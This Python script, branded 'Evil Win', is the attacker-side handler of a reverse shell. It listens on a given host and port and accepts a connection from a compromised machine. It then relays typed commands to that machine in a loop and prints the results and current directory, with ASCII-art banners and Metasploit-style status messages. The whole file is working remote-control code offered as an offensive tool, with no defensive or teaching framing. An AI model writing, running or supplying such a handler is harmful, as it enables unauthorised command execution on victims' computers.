from termcolor import colored
from colorama import Fore, init
import socket
import time
import sys
import os
init()

RH = Fore.LIGHTRED_EX
R = Fore.RED
Y = Fore.YELLOW
G = Fore.LIGHTGREEN_EX
M = Fore.CYAN
W = Fore.WHITE
B = Fore.LIGHTBLUE_EX
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

os.system("clear")
print(RH+"""
                   (    (  (                 
     (     )   (   )\   )\))(   ' (          
     )\   /((  )\ ((_) ((_)()\ )  )\   (     
    (("""+R+"""_"""+RH+""") (_))\((_)"""+RH+"""("""+R+"""_"""+RH+""") ("""+R+"""_"""+RH+"""(())\_)()((_)  )\ )"""+R+"""  
    | __|_"""+RH+"""\((_)"""+R+"""(_)| |  \ \ """+RH+"""(_)"""+R+"""/ / (_) _"""+RH+"""("""+R+"""_"""+RH+"""/(  """+R+"""
    | _| \ V / | || |   \ \/\/ /  | || ' \ """+RH+""") """+R+"""
    |___| \_/  |_||_|    \_/\_/   |_||_||_|   
                                     
       """+R+"""=[ """+Y+"""Evil Win                   """+R+""" ]
"""+R+"""+ -- --=[ """+R+"""@i_am_unbekannt"""+R+"""             ]
"""+R+"""+ -- --=[ """+W+"""i-am-unbekannt.github.io"""+R+""" ]
"""+W)

try:
	SERVER_HOST = sys.argv[1]
	SERVER0PORT = sys.argv[2]
	SERVER_PORT = int(SERVER0PORT)
except IndexError as err:
	print(B+"[-] "+W+"usage: evin-win.py [HOST] [PORT]")
	sys.exit(1)
except ValueError as Valerr:
	print(B+"[-] "+W+"input of ip or port is wrong: "+ colored(f'{SERVER_HOST}:{SERVER0PORT}', 'white', attrs=['underline']))
	sys.exit(3)

try:
	s = socket.socket()
	s.bind((SERVER_HOST, SERVER_PORT))
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.listen(5)
except socket.gaierror as socketerr:
	print(B+"[-] "+W+socketerr)
	print(B+"[-] "+W+"input of ip or port is wrong: "+ colored(f'{SERVER_HOST}:{SERVER_PORT}', 'white', attrs=['underline']))
	sys.exit(2)
except OSError as oserr:
	print(B+"[-] "+W+oserr)
	print(B+"[-] "+W+"input of ip or port is wrong: "+ colored(f'{SERVER_HOST}:{SERVER_PORT}', 'white', attrs=['underline']))
	sys.exit(4)

print()
print(B+"[*]"+W+f" Started reverse TCP handler on {SERVER_HOST}:{SERVER_PORT}")

client_socket, client_address = s.accept()
print(B+"[*]"+W+f" Evil Win session 1 opened ({SERVER_HOST}:{SERVER_PORT} -> {client_address[0]}:{client_address[1]})")
print(B+"[*]"+W+" Type 'exit' to leave Evil Win session 1")
print()

cwd = client_socket.recv(BUFFER_SIZE).decode()

while True:
	command = input(colored('Evil Win', 'red', attrs=['underline']) + ' @('+RH+f'{cwd}'+W+') > ')
	if not command.strip():
		continue
	client_socket.send(command.encode())
	if command.lower() == "exit":
		break
	output = client_socket.recv(BUFFER_SIZE).decode()
	try:
		results, cwd = output.split(SEPARATOR)
		print(results)
	except ValueError as Valerr2:
		print(B+"[*]"+W+f" {client_address[0]} - Evil Win session 1 closed.")
		sys.exit()
client_socket.close()
s.close()
os.system('clear')
print(RH+"""
                   (    (  (                 
     (     )   (   )\   )\))(   ' (          
     )\   /((  )\ ((_) ((_)()\ )  )\   (     
    (("""+R+"""_"""+RH+""") (_))\((_)"""+RH+"""("""+R+"""_"""+RH+""") ("""+R+"""_"""+RH+"""(())\_)()((_)  )\ )"""+R+"""  
    | __|_"""+RH+"""\((_)"""+R+"""(_)| |  \ \ """+RH+"""(_)"""+R+"""/ / (_) _"""+RH+"""("""+R+"""_"""+RH+"""/(  """+R+"""
    | _| \ V / | || |   \ \/\/ /  | || ' \ """+RH+""") """+R+"""
    |___| \_/  |_||_|    \_/\_/   |_||_||_|   
                                     
       """+R+"""=[ """+Y+"""Evil Win                   """+R+""" ]
"""+R+"""+ -- --=[ """+R+"""@i_am_unbekannt"""+R+"""             ]
"""+R+"""+ -- --=[ """+W+"""i-am-unbekannt.github.io"""+R+""" ]
"""+W)
print(B+"[*]"+W+f" {client_address[0]}:{client_address[1]} - Evil Win session 1 closed.")
sys.exit()
